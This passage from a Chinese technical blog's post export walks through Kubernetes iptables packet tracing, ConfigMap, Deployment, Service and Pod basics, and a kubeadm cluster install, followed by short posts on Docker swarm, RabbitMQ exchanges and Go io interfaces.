RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) iptables 的 KUBE-NODEPORTS 如下： 1234Chain KUBE-NODEPORTS (1 references)target prot opt source destinationKUBE-MARK-MASQ tcp -- 0.0.0.0/0 0.0.0.0/0 /* default/nginx: */ tcp dpt:32741KUBE-SVC-4N57TFCL4MD7ZTDA tcp -- 0.0.0.0/0 0.0.0.0/0 /* default/nginx: */ tcp dpt:32741 先走第一个条 KUBE-MARK-MASQ 1TRACE: nat:KUBE-MARK-MASQ:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) iptables 的 KUBE-MARK-MASQ 如下： 123Chain KUBE-MARK-MASQ (11 references)target prot opt source destinationMARK all -- 0.0.0.0/0 0.0.0.0/0 MARK or 0x4000 k8s 会给报文打上 0x4000 的标签, 打完标签后会返回，然后继续匹配 KUBE-NODEPORTS 的下一条规则。也就是 KUBE-SVC-4N57TFCL4MD7ZTDA 12345TRACE: nat:KUBE-MARK-MASQ:return:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000TRACE: nat:KUBE-NODEPORTS:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000TRACE: nat:KUBE-SVC-4N57TFCL4MD7ZTDA:rule:1 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000 iptables 的 KUBE-SVC-4N57TFCL4MD7ZTDA 如下： 123Chain KUBE-SVC-4N57TFCL4MD7ZTDA (2 references)target prot opt source destinationKUBE-SEP-PJQYOXMI5CEBVECW all -- 0.0.0.0/0 0.0.0.0/0 进入 KUBE-SEP-PJQYOXMI5CEBVECW 1TRACE: nat:KUBE-SEP-PJQYOXMI5CEBVECW:rule:2 IN=enp0s3 OUT= MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.199.119 LEN=64 TOS=0x00 PREC=0x00 TTL=64 ID=0 DF PROTO=TCP SPT=50995 DPT=32741 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000 iptables 的 KUBE-SEP-PJQYOXMI5CEBVECW 如下： 1234Chain KUBE-SEP-PJQYOXMI5CEBVECW (1 references)target prot opt source destinationKUBE-MARK-MASQ all -- 192.168.3.4 0.0.0.0/0DNAT tcp -- 0.0.0.0/0 0.0.0.0/0 tcp to:192.168.3.4:80 可以看到这里走的是 DNAT, 将报文中的目的地址换成了 92.168.3.4:80, 也就是 k8s 服务对应 pod 的 ip 和端口号。 DNAT 完了之后会将报文发给 filter 表的 FORWARD 链。 1TRACE: filter:FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000 iptables 的 FORWARD 如下： 12345678910Chain FORWARD (policy DROP)target prot opt source destinationKUBE-FORWARD all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes forwarding rules */DOCKER-ISOLATION all -- 0.0.0.0/0 0.0.0.0/0DOCKER all -- 0.0.0.0/0 0.0.0.0/0ACCEPT all -- 0.0.0.0/0 0.0.0.0/0 ctstate RELATED,ESTABLISHEDACCEPT all -- 0.0.0.0/0 0.0.0.0/0ACCEPT all -- 0.0.0.0/0 0.0.0.0/0ACCEPT all -- 192.168.3.0/24 0.0.0.0/0ACCEPT all -- 0.0.0.0/0 192.168.3.0/24 可以看到匹配第一条，进入 KUBE-FORWARD 1TRACE: filter:KUBE-FORWARD:rule:1 IN=enp0s3 OUT=cni0 MAC=08:00:27:63:c4:b1:f0:18:98:36:f6:c4:08:00 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000 iptables 的 KUBE-FORWARD 如下： 12345Chain KUBE-FORWARD (1 references)target prot opt source destinationACCEPT all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes forwarding rules */ mark match 0x4000/0x4000ACCEPT all -- 192.168.3.0/24 0.0.0.0/0 /* kubernetes forwarding conntrack pod source rule */ ctstate RELATED,ESTABLISHEDACCEPT all -- 0.0.0.0/0 192.168.3.0/24 /* kubernetes forwarding conntrack pod destination rule */ ctstate RELATED,ESTABLISHED forward 完了之后会转给 iptables 的 nat 表的 POSTROUTING: 1TRACE: nat:POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000 iptables 的 POSTROUTING 如下： 12345678Chain POSTROUTING (policy ACCEPT)target prot opt source destinationKUBE-POSTROUTING all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes postrouting rules */MASQUERADE all -- 172.17.0.0/16 0.0.0.0/0RETURN all -- 192.168.3.0/24 192.168.3.0/24MASQUERADE all -- 192.168.3.0/24 !224.0.0.0/4RETURN all -- !192.168.3.0/24 192.168.3.0/24MASQUERADE all -- !192.168.3.0/24 192.168.3.0/24 命中第一条，转给 KUBE-POSTROUTING 1TRACE: nat:KUBE-POSTROUTING:rule:1 IN= OUT=cni0 SRC=192.168.199.132 DST=192.168.3.4 LEN=64 TOS=0x00 PREC=0x00 TTL=63 ID=0 DF PROTO=TCP SPT=50995 DPT=80 SEQ=1677343889 ACK=0 WINDOW=65535 RES=0x00 SYN URGP=0 OPT (020405B4010303050101080A08CB9A710000000004020000) MARK=0x4000 iptables 的 KUBE-POSTROUTING 如下： 123Chain KUBE-POSTROUTING (1 references)target prot opt source destinationMASQUERADE all -- 0.0.0.0/0 0.0.0.0/0 /* kubernetes service traffic requiring SNAT */ mark match 0x4000/0x4000 汇总一下，大概路线如下： 1234567891011121314151617181920212223242526--&gt; [nat]PREROUTING | | V [nat]KUBE-SERVICES | | V [nat]KUBE-NODEPORTS | | V [nat]KUBE-MARK-MASQ (打0x4000的标签) | | V [nat]KUBE-NODEPORTS | | V [nat]KUBE-SVC-4N57TFCL4MD7ZTDA [filter]KUBE-FORWARD -----&gt; [nat]POSTROUTING | ^ | | | | V | V [nat]KUBE-SEP-PJQYOXMI5CEBVECW ------------&gt;[filter]FORWARD [nat]KUBE-POSTROUTING(DNAT, 替换DST和DPT, 将物理机地址换成pod地址) 清除追踪规则 查看规则 number 12345678$ sudo iptables -t raw -nL --line-numberChain PREROUTING (policy ACCEPT)num target prot opt source destination1 TRACE tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:32741Chain OUTPUT (policy ACCEPT)num target prot opt source destination1 TRACE tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:32741 删除规则上面查到的 number 是 1, 这里删除第一条规则： 12$ sudo iptables -t raw -D PREROUTING 1$ sudo iptables -t raw -D OUTPUT 1 参考文献[1] How to trace IPTables]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之job]]></title>
    <url>%2F2018%2F11%2F21%2Fk8s-job%2F</url>
    <content type="text"><![CDATA[Kubernetes 有两种类型的 job, 分别是 Job 和 CronJonb。 Job: 负责批量处理短暂的一次性任务，仅执行一次，并保证处理的一个或者多个Pod成功结束。 CronJob: 负责定时任务，在指定的时间周期运行指定的任务。]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之configmap]]></title>
    <url>%2F2018%2F11%2F21%2Fk8s-configmap%2F</url>
    <content type="text"><![CDATA[很多生产环境中的应用程序较为复杂，可能需要多个 config 文件，命令行参数和环境变量的组合。并且这些配置信息应该从镜像中解耦出来，以保证镜像的可移植性以及配置信息不被泄漏。社区使用 ConfigMap 满足这一需求。 ConfigMap 包含了一系列键值对，用于存储被 pod 或者系统组件（如 controller 等）访问的信息。 创建 ConfigMap通过文件创建from-file 的参数可以是单个文件，也可以是目录，如果多个文件可以使用多个 --from-file参数。 1kubectl create configmap &lt;name&gt; --from-file=&lt;file&gt; 使用 ConfigMap 中的信息通过环境变量调用假设已经创建了一个 ConfigMap, 信息如下： 12345678apiVersion: v1kind: ConfigMapmetadata: name: special-config namespace: defaultdata: special.how: very special.type: charm 定义 pod 123456789101112131415161718192021apiVersion: v1kind: Podmetadata: name: test-podspec: containers: - name: test-container image: busybox command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;env&quot;] env: - name: SPECIAL_LEVEL_KEY valueFrom: configMapKeyRef: name: special-config key: special.how - name: SPECIAL_TYPE_KEY valueFrom: configMapKeyRef: name: special-config key: special.type restartPolicy: Never pod 启动后会输出所有的环境变量信息，其中包括: 12SPECIAL_LEVEL_KEY=verySPECIAL_TYPE_KEY=charm 设置命令行参数configmap 还可以通过命令行注入，用户可以通过 $(VAR_NAME)方式调用： 123456789101112131415161718192021apiVersion: v1kind: Podmetadata: name: test-podspec: containers: - name: test-container image: busybox command: [&quot;/bin/sh&quot;, &quot;-c&quot;, &quot;echo $(SPECIAL_LEVEL_KEY) $(SPECIAL_TYPE_KEY)&quot;] env: - name: SPECIAL_LEVEL_KEY valueFrom: configMapKeyRef: name: special-config key: special.how - name: SPECIAL_TYPE_KEY valueFrom: configMapKeyRef: name: special-config key: special.type restartPolicy: Never volume plugin这是 configmap 最核心的用法，最基本的是通过文件名指定： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051apiVersion: v1kind: ConfigMapmetadata: name: nginx-confdata: nginx.conf: | user nginx; worker_processes 3; error_log /var/log/nginx/error.log; events &#123; worker_connections 10240; &#125; http &#123; log_format main &apos;remote_addr:$remote_addr\t&apos; &apos;time_local:$time_local\t&apos; &apos;method:$request_method\t&apos; &apos;uri:$request_uri\t&apos; &apos;host:$host\t&apos; &apos;status:$status\t&apos; &apos;bytes_sent:$body_bytes_sent\t&apos; &apos;referer:$http_referer\t&apos; &apos;useragent:$http_user_agent\t&apos; &apos;forwardedfor:$http_x_forwarded_for\t&apos; &apos;request_time:$request_time&apos;; access_log /var/log/nginx/access.log main; server &#123; listen 80; server_name _; location / &#123; root html; index index.html index.htm; &#125; &#125; include /etc/nginx/virtualhost/virtualhost.conf; &#125; virtualhost.conf: | upstream app &#123; server localhost:8080; keepalive 1024; &#125; server &#123; listen 80 default_server; root /usr/local/app; access_log /var/log/nginx/app.access_log main; error_log /var/log/nginx/app.error_log; location / &#123; proxy_pass http://app/; proxy_http_version 1.1; &#125; &#125; pod 定义： 1234567891011121314151617181920212223242526272829apiVersion: apps/v1beta1kind: Deploymentmetadata: name: nginxspec: replicas: 1 template: metadata: labels: app: nginx spec: containers: - name: nginx image: nginx ports: - containerPort: 80 volumeMounts: - mountPath: /etc/nginx # mount nginx-conf volumn to /etc/nginx readOnly: true name: nginx-conf volumes: - name: nginx-conf configMap: name: nginx-conf # place ConfigMap `nginx-conf` on /etc/nginx items: - key: nginx.conf path: nginx.conf - key: virtualhost.conf path: virtualhost/virtualhost.conf # dig directory]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之daemonset]]></title>
    <url>%2F2018%2F11%2F21%2Fk8s-daemonset%2F</url>
    <content type="text"></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之deployment]]></title>
    <url>%2F2018%2F11%2F21%2Fk8s-deployment%2F</url>
    <content type="text"><![CDATA[Deployment 多用于为 pod 和 replia set 提供更新，并且可以方便地跟踪观察其所属的 replica set 或者 pod 数量以及状态的变化。 Node 调度有时候我们希望 pod 运行在指定的一个或者一批 node 上。可以通过 node 的名字或者 label 来完成。 NodeNamePod.spec.nodeName用于强制约束将Pod调度到指定的Node节点上，这里说是“调度”，但其实指定了nodeName的Pod会直接跳过Scheduler的调度逻辑，直接写入PodList列表，该匹配规则是强制匹配。 eg: 1234567891011121314151617apiVersion: apps/v1kind: Deploymentmetadata: name: my-deployspec: replicas: 1 template: metadata: labels: app: my-app spec: nodeName: master # 指定调度到master节点 containers: - name: nginx image: nginx ports: - containerPort: 80 NodeSelector Pod.spec.nodeSelector是通过kubernetes的label-selector机制进行节点选择，由scheduler调度策略 MatchNodeSelector进行label匹配，调度pod到目标节点，该匹配规则是强制约束。 查看节点 label1kubectl get nodes --show-labels 添加 label1234kubectl label nodes &lt;node_name&gt; &lt;key&gt;=&lt;value&gt;# eg:kubectl label nodes master region=shanghai pod 中指定 label123456789101112131415161718apiVersion: apps/v1kind: Deploymentmetadata: name: my-deployspec: replicas: 1 template: metadata: labels: app: my-app spec: nodeSelector: region: shanghai # 指定调度到上海的节点 containers: - name: nginx image: nginx ports: - containerPort: 80]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之Replica Sets]]></title>
    <url>%2F2018%2F11%2F21%2Fk8s-rs%2F</url>
    <content type="text"><![CDATA[ReplicaSet 是下一代的Replication Controller.一个 ReplicaSet 和一个 Replication Controller 之间唯一的不同目前是对选择器的支持. ReplicaSet 支持最新的基于集合的选择器需求,这描述在标签用户指南然而一个Replication Controller 仅仅支持基于等号的选择器需求. 大部分的kubectl命令不仅支持Replication Controllers也支持ReplicaSets.一个例外是rolling-update命令. 如果你想功能上滚动升级,请考虑使用Deployments来替代.并且rolling-update是命令式的而Deployments则是陈述式的,所以我们推荐 通过rollout这个命令来使用Deployments. 当ReplicaSets能够被独立地使用的时候,今天它主要地被用在Deployments上作为精心策划pod创建,删除和升级的一个机制.当你使用Deployments的时候,你无需去 担心Deployments建立的ReplicaSets怎么去管理.Deployments 拥有和管理他们自己的ReplicaSets. 使用 ReplicaSet一个ReplicaSet保证pod副本为一个指定的数目在给定的任何时间内.然而,一个Deployment是一个更高级别的概念来去管理ReplicaSets 和提供描述性的pods升级以及很多其他有用的特性.因此,我们推荐使用Deployments来替代直接使用ReplicaSets,除非你需要定制的更新编排 或者一点也不需要更新. 这个事实上意味着你可能从不需要操作ReplicaSet对象： 直接使用一个Deployment然后在声明部分定义你的应用.]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之rc]]></title>
    <url>%2F2018%2F11%2F21%2Fk8s-rc%2F</url>
    <content type="text"></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之service]]></title>
    <url>%2F2018%2F11%2F20%2Fk8s-service%2F</url>
    <content type="text"><![CDATA[由于重新调度等原因，pod 在 kubernetes 中的 IP 地址不是固定的，因此需要一个代理来确保使用 pod 的应用不需要知晓 pod 的真实 IP 地址。另一个原因是当使用 replication controller 创建了多个 pod 副本时，需要一个代理来为这些 pod 做负载均衡。 service 主要由一个 IP 地址和 label selector 构成。在创建之初，每个 service 便被分配了一个独一无二的 IP 地址，该 IP 地址与 service 的生命周期相同，且不再更改。 service 工作原理kubernetes 在每个节点都运行 kube-proxy 服务，它是实现 service 的主要组件。kube-proxy 有 userspace 和 iptables 两种工作模式。Kubernetes 在 1.2.0及以后的版本默认启用 iptables 模式，只有在系统 kernel 版本或者 iptables 版本不支持时，才使用 userspace 模式。 kubernetes 会给每个 service 分配一个固定 IP，这是一个虚拟IP（也称 ClusterIP）, 其范围是在集群初始化时 --service-cluster-ip-range 指定。 Service 是根据 Label Selector 来筛选 pod 的，实际上 service 是通过 endpoints 来衔接 pod 的。 123456789101112131415161718192021222324252627282930$ kubectl get svcNAME TYPE CLUSTER-IP EXTERNAL-IP PORT(S) AGEkubernetes ClusterIP 192.168.2.1 &lt;none&gt; 443/TCP 7d18hnginx NodePort 192.168.2.39 &lt;none&gt; 80:3782/TCP 42h$ kubectl get podsnginx-deployment-d55b94fd-5thcb 1/1 Running 0 47h$ kubectl get endpoints nginx -o yamlapiVersion: v1kind: Endpointsmetadata: creationTimestamp: 2018-11-28T08:03:17Z name: nginx namespace: default resourceVersion: &quot;688700&quot; selfLink: /api/v1/namespaces/default/endpoints/nginx uid: 1081f1a7-f2e4-11e8-858a-fa163e433fdasubsets:- addresses: - ip: 192.168.3.15 nodeName: master targetRef: kind: Pod name: nginx-deployment-d55b94fd-5thcb namespace: default resourceVersion: &quot;663671&quot; uid: 99782bc0-f2ba-11e8-858a-fa163e433fda - port: 80 protocol: TCP 通过上面的例子可以看出 endpoints 里有服务对应 pod 的名字和 ip 信息。 userspace 模式对于每个 service, kube-proxy 都会在宿主机上随机监听一个端口与这个 service 对应起来，并非在宿主机上建立起 iptables 规则，将 service IP: service port 重定向到上述端口。 iptables 模式iptables 模式下 kube-proxy 只负责创建和维护 iptables 规则，其余工作均有内核完成。 service 的自发现一旦 service 被创建，该 service 的 IP 和 port 等信息都可以注入到 pod 中供他们使用。Kubernetes 支持两种 service 发现机制： 环境变量和 DNS. 环境变量方式环境变量的注入只发生在 pod 创建时，且不会被自动更新。 DNS 方式DNS 缓存问题会导致如下两种不可靠情况 DNS 函数库对 DNS TTL 支持不良问题由来已久。 即使应用程序和 DNS 服务器能够进行恰当的域名重解析操作，每个客户端频繁的域名重解析请求将给系统带来极大的负荷。 service 外部路由service 通常分为三种类型，分别为 ClusterIP, NodePort 和 Loadbalancer。其中 ClusterIP 是最基本的类型，在默认情况下只能在集群内部访问。 NodePort如果将 service 设置为 NodePort, 系统会从 service-node-port-range 范围中分配一个端口，默认随机分配，用户也可以自行指定。集群中每个工作节点都会打开该端口。 LoadbalancerLoadbalancer 类型的 service 并不是由 kubernetes 集群维护的，需要云服务提供商的支持。如何将外部 loadbalancer 接入的流量导到后端 pod，取决于具体云服务提供商的实现。 external ipservice 模板123456789101112apiVersion: v1kind: Servicemetadata: name: appspec: selector: app: app type: NodePort ports: - protocol: TCP port: 5000 nodePort: 80]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之pod]]></title>
    <url>%2F2018%2F11%2F20%2Fk8s-pod%2F</url>
    <content type="text"><![CDATA[在 Kubernetes 中，能够被创建，调度和管理的最小单元是 pod, 而非单个容器。一个 pod 是由若干个 Docker 容器构成的容器组（pod意为豆荚）。 pod里的容器共享 network namespace, 并通过 volume 机制共享一部分存储。 pod里的容器共享如下资源： pod 是IP等网络资源分配的基本单位，这个IP及network namespace是由pod里的容器共享的。 pod内的所有容器也共享volume。 IPC namespace UTS namespace label每个pod都有一个属性labels – 一组键值对，例如： 1234&quot;labels&quot;: &#123; &quot;key1&quot;: &quot;value1&quot;, &quot;key2&quot;: &quot;value2&quot;&#125; 相等查询12environment = productiontier != frontend 子集查询123environment in (production, qa)tier notin (frontend, backend)partition pod 模板12345678910111213kind: Podmetadata: name: busybox namespace: defaultspec: containers: - name: busybox image: busybox command: - sleep - &quot;36000&quot; imagePullPolicy: IfNotPresent restartPolicy: Always 常用命令根据 label 获取 pod1kubectl get pods -l name=nginx]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[k8s学习之帮助查看]]></title>
    <url>%2F2018%2F11%2F20%2Fk8s-doc%2F</url>
    <content type="text"><![CDATA[kubectl 提供了 explain 子命令来帮助我们查看 kubernetes 文档。 例如我们想查看 pod 有哪些参数： 1$ kubectl explain pod 具体演示参考：]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[kubeadm 安装 k8s]]></title>
    <url>%2F2018%2F11%2F20%2Fk8s-install%2F</url>
    <content type="text"><![CDATA[本文介绍使用 kubeadm 安装 k8s 集群。建议不要用在生产环境。使用 kubeadm 安装，如果 master 节点挂了，是没有办法操作的。 安装版本： k8s: 1.12.2 docker: 17.3.2 防火墙配置1234567# 关闭 firewalldsystemctl disable firewalldsystemctl stop firewalld# 关闭 selinuxsetenforce 0sed -i &quot;s/^SELINUX=enforcing/SELINUX=disabled/g&quot; /etc/selinux/config 内核参数配置1echo 1 &gt; /proc/sys/net/bridge/bridge-nf-call-iptables hosts 配置在 /etc/hosts 文件中配置集群的主机，例如： 123192.168.1.2 master192.168.1.3 node1192.168.1.4 node2 yum 源配置添加 docker 源CentOS 默认源的docker版本比较低，很多特性不支持，另外k8s对docker版本有要求，这里我们配置 docker-ce 源。 12yum-config-manager --add-repo \ http://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.repo 添加 k8s 源12345678910cat &lt;&lt;EOF &gt; /etc/yum.repos.d/kubernetes.repo[kubernetes]name=Kubernetesbaseurl=http://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64enabled=1gpgcheck=0repo_gpgcheck=0gpgkey=http://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg http://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpgEOF 安装 docker由于 k8s 对 docker 版本有要求，最新的 docker 版本不一定支持，这里安装指定版本。 123456789# 查看可用版本yum list docker-ce --showduplicatesyum install -y --setopt=obsoletes=0 \ docker-ce-17.03.2.ce-1.el7.centos.x86_64 \ docker-ce-selinux-17.03.2.ce-1.el7.centos.noarchsystemctl enable dockersystemctl start docker 安装 kubeadm 和 kubectl123yum install -y kubeadm kubectlsystemctl enable kubelet 下载 k8s 镜像由于网络原因，kubeadm 需要的镜像无法下载，这里我们使用别人的代理下载。 查看所需 docker 镜像12# 这个命令仅使用 v1.10 以上kubeadm config images list 添加 pullimages.sh 脚本, 并执行， 脚本内容如下： 123456789101112131415#!/bin/bashimages=( kube-apiserver:v1.12.2 kube-controller-manager:v1.12.2 kube-scheduler:v1.12.2 kube-proxy:v1.12.2 pause:3.1 etcd:3.2.24 coredns:1.2.2)for imageName in $&#123;images[@]&#125; ; do docker pull anjia0532/google-containers.$imageName docker tag anjia0532/google-containers.$imageName k8s.gcr.io/$imageName docker rmi anjia0532/google-containers.$imageNamedone 初始化集群1234kubeadm init \ --kubernetes-version=v1.12.2 \ --pod-network-cidr=192.168.3.0/24 \ --service-cidr=192.168.2.0/24 master 参与调度默认情况下集群不会调度 pod 到 master 节点，可以执行如下命令来控制 1kubectl taint nodes --all node-role.kubernetes.io/master- 命令补全1234yum install -y bash-completionsource /usr/share/bash-completion/bash_completionsource &lt;(kubectl completion bash)echo &quot;source &lt;(kubectl completion bash)&quot; &gt;&gt; ~/.bashrc servcie 端口范围修改k8s service 默认的端口范围是 30000-32767, 如果想修改端口范围，进行如下操作： 修改 /etc/kubernetes/manifests/kube-apiserver.yaml，添加： --service-node-port-range=80-32767 systemctl restart kubelet.service 常见问题Dns loop detected 编辑 configmap 1kubectl -n kube-system edit configmap coredns 注释掉 loop 12345678910111213141516171819202122apiVersion: v1data: Corefile: | .:53 &#123; errors health kubernetes cluster.local in-addr.arpa ip6.arpa &#123; pods insecure upstream fallthrough in-addr.arpa ip6.arpa &#125; prometheus :9153 proxy . /etc/resolv.conf cache 30 #loop reload loadbalance &#125;kind: ConfigMapmetadata: creationTimestamp: 2018-11-20T03:08:28Z name: coredns token 过期token 默认有效期是 24h, 如果 token 过期了，创建新 token 再加入集群： 1kubeadm token create 其它节点 pod cidr 问题 查看节点是否设置了 pod cidekubectl get nodes -o jsonpath=&#39;{.items[*].spec.podCIDR}&#39; 如果没有设置，设置节点的 pod CIDRkubectl patch node &lt;NODE_NAME&gt; -p &#39;{&quot;spec&quot;:{&quot;podCIDR&quot;:&quot;&lt;SUBNET&gt;&quot;}}&#39; 参考： flannel Troubleshooting]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>k8s</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[docker 三剑客]]></title>
    <url>%2F2018%2F11%2F18%2Fdocker-scm%2F</url>
    <content type="text"><![CDATA[docker 三剑客主要用于容器的编排。 创建服务docker service create –replicas 2 –name hello app 服务规模调整docker service scale hello=3docker stack deploy -c docker-compose.yml hello 关闭服务docker stack rm hello 滚动更新task 概念 离开集群docker swarm leave –force 容器运行节点docker stack ps volume + bind mounts 设置节点状态1234# 禁用docker node update --availability drain work1# 启用docker node update --availability active worker1 查看 Tokendocker swarm join-token worker/manager docker config 配置docker network create –attachable –driver overlay oneta 123456version: &quot;3&quot;networks: mynet: driver: overlay attachable: trueservices:]]></content>
      <categories>
        <category>PaaS</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[rabbitmq]]></title>
    <url>%2F2018%2F10%2F17%2Frabbitmq%2F</url>
    <content type="text"><![CDATA[Exchange在生产者/消费者模型中，生产者是不会直接将消息发送到队列的，生产者只能把消息发送到 exchange 上。 先看一个简单的模型： exchange 的一端是生产者，另一端是队列，exchange 需要知道把消息发送到哪些队列。 有了 exchange 和队列之后，需要进行 bindings, 来告诉 exchange 把消息发送到指定队列。 123channel.queue_bind(exchange=exchange_name, queue=queue_name, routing_key='black') 在 bindings 的时候，可以指定 routing_key，来控制消息要发送的队列。 当然多个队列可以有相同的 routing_key 一个完整的生产者消费者模型如下： 根据不同的规则，rabbitmq 划分了四种 exchange： Direct Fanout: 把消息发送到所有绑定的队列； Topic: Headers]]></content>
      <categories>
        <category>mq</category>
      </categories>
      <tags>
        <tag>mq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[go io]]></title>
    <url>%2F2018%2F08%2F22%2Fgo-io%2F</url>
    <content type="text"><![CDATA[go 语言的标准库 io 包主要定义了常用的 io接口，具体如如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657// 读取接口type Reader interface &#123; Read(p []byte) (n int, err error)&#125;// 写接口type Writer interface &#123; Write(p []byte) (n int, err error)&#125;// 关闭读写type Closer interface &#123; Close() error&#125;// 指定位置type Seeker interface &#123; Seek(offset int64, whence int) (int64, error)&#125;// 指定位置读取type ReaderAt interface &#123; ReadAt(p []byte, off int64) (n int, err error)&#125;// io 包还提供了一些组合接口type ReadSeeker interface &#123; Reader Seeker&#125;type WriteCloser interface &#123; Writer Closer&#125;type WriteSeeker interface &#123; Writer Seeker&#125;type ReadWriter interface &#123; Reader Writer&#125;type ReadWriteCloser interface &#123; Reader Writer Closer&#125;type ReadWriteSeeker interface &#123; Reader Writer Seeker&#125; 实现了上面接口的包如下： strings.Reader 实现了 io.Reader os.File 同时实现了 io.Reader 和 io.Writer net.conn 实现了 io.Reader, io.Writer, io.Close bufio.Reader/Writer 分别实现了io.Reader 和 io.Writer bytes.Buffer 同时实现了 io.Reader 和 io.Writer bytes.Reader 实现了io.Reader ioutil 12// 读取所有数据func ReadAll(r io.Reader) ([]byte, error)]]></content>
      <categories>
        <category>coding</category>
      </categories>
      <tags>
        <tag>go</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables 介绍]]></title>
    <url>%2F2018%2F06%2F29%2Fiptables%2F</url>
